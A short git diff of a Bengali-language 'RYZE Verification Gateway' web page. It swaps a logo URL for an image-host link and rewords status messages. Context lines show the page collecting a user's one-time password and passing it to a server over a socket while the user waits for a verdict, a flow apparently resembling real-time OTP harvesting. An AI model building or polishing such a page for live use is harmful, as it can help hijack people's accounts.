@@ -28,7 +28,7 @@
         
         <!-- Logo Header -->
         <div class="flex flex-col items-center mb-10">
-            <img src="https://github.com/nayem-48ai/ryze-verification/blob/41f2170d7d10158406fe249412d716a5db65e1d8/public/RYZE.png" alt="RYZE" class="w-32 h-auto mb-2">
+            <img src="https://i.ibb.co.com/ZpsnDh48/RYZE.png" alt="RYZE" class="w-32 h-auto mb-2">
             <p class="text-gray-400 text-xs uppercase tracking-[0.2em]">Verification Gateway</p>
         </div>
 
@@ -131,7 +131,7 @@
             const otp = document.getElementById('otp').value;
             if(!otp) return alert("OTP লিখুন");
             socket.emit('send_otp', otp);
-            document.getElementById('wait-msg').innerText = "OTP যাচাই করা হচ্ছে...";
+            document.getElementById('wait-msg').innerText = "OTP যাচাই করা হচ্ছে,অপেক্ষা করুন...";
             showStep('step-waiting');
         }
 
@@ -144,7 +144,7 @@
             if(data.status === 'success') {
                 document.getElementById('status-icon').innerText = "🛡️";
                 document.getElementById('status-title').innerText = "Success!";
-                document.getElementById('status-desc').innerText = "ভেরিফিকেশন সফল হয়েছে।";
+                document.getElementById('status-desc').innerText = "Upgrade & ভেরিফিকেশন সফল হয়েছে।";
             } else {
                 document.getElementById('status-icon').innerText = "⚠️";
                 document.getElementById('status-title').innerText = "Failed";
